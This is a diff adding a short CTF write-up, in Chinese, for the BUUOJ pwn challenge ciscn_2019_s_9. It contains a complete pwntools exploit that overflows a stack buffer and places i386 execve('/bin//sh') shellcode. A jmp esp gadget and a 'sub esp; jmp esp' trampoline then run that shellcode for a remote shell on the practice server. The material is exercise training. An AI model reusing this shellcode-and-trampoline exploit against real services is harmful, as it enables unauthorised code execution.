@@ -606,6 +606,45 @@ if __name__ == "__main__":
     main()
 ```
 
+### ciscn_2019_s_9
+
+[题目链接](https://buuoj.cn/challenges#ciscn_2019_s_9)
+
+没开 NX 保护，像是 shellcode。
+
+然后发现 hint 里面有 jmp esp，那么后面接一个 `sub esp,offset`，ret 时，esp 自动下移，eip 等于 jmp esp，然后就会执行 `sub esp,offset`，esp 上移到 shellcode，那么再 jmp esp 一次就好了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27999
+io = remote(host,port)
+# io = process("./ciscn_s_9")
+elf = ELF("./ciscn_s_9")
+# system = elf.sym['system']
+hint = 0x8048554
+
+def main():
+    io.recvuntil(b"Do you have anything to tell?\n")
+    io.recvline()
+    shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+    payload = shellcode.ljust(0x24,b"\x00")
+    payload += p32(hint) + asm("sub esp,0x28;jmp esp")
+    # gdb.attach(io,"b *0x8048550\nc")
+    # pause()/
+    io.sendline(payload)
+    io.interactive()
+    # payload = p32(system) + p32(0) + p32(shell)
+
+
+if __name__ == "__main__":
+    main()
+
+```
 
 ## 中水区
 
